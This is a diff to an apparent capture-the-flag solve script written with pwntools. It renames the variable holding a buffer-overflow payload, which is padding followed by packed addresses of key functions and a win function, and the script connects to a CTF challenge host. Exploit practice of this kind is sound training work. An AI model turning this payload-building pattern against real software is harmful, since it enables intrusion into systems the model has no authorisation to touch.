@@ -148,8 +148,8 @@ def run(conn, payload: bytes):
 def solvefunction():
     # Create the payload with the necessary sequence of offsets (keys)
     # Use p64 to pack the addresses as 64-bit little-endian values
-    null_byte_string = b'A' * 12 + p64(key3) + p64(key1) + p64(key2_1) + p64(key2_2) + p64(key3) + p64(win)
-    return null_byte_string
+    solution = b'A' * 12 + p64(key3) + p64(key1) + p64(key2_1) + p64(key2_2) + p64(key3) + p64(win)
+    return solution
 
 # Connect to the remote service
 conn = remote("chal.bearcatctf.io", 39440)
